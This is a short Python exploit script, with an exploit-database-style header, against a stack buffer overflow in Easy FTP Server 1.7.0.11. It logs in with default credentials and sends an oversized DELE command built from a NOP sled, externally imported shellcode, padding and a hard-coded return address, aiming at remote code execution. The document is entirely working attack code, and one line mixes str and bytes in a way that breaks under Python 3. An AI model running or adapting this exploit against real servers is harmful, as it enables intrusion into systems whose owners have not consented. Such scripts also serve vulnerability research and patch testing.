# Exploit Title: Easy FTP Server v1.7.0.11 Multiple Command Buffer Overflow
# Date: August 12, 2010
# Author: Glafkos Charalambous
# Software Link: http://easyftpsvr.googlecode.com/files/easyftp-server-1.7.0.11-en.zip
# Version: 1.7.0.11
# Tested on: Windows XP SP3 En
# Vulnerable Commands: DELE, STOR, RNFR, RMD, XRMD

from time import sleep
from base64 import b64encode
from payload import buf
import socket

def shell_attack(target_machine, target_port):
  
    target = target_machine
    port = target_port
    command = b"DELE"

    buffersize = 268
    

    

    
    
    eip = b"\x91\xC8\x41\x7E"
    nopsled = b"\x90" * 16
    junk = b"\x90" * (buffersize-(len(nopsled)+len(buf)))
    payload = nopsled+buf+junk+eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        print("[+] Connected")
    except:
        print("[!] Connection Failed")
        pass
        
    s.recv(1024)
        
    s.send(b'User ftp\r\n')
    s.recv(1024)
    s.send(b'PASS ftp\r\n')
    s.recv(1024)
    
    s.send(command +' '+payload+b'\r\n')
    s.close()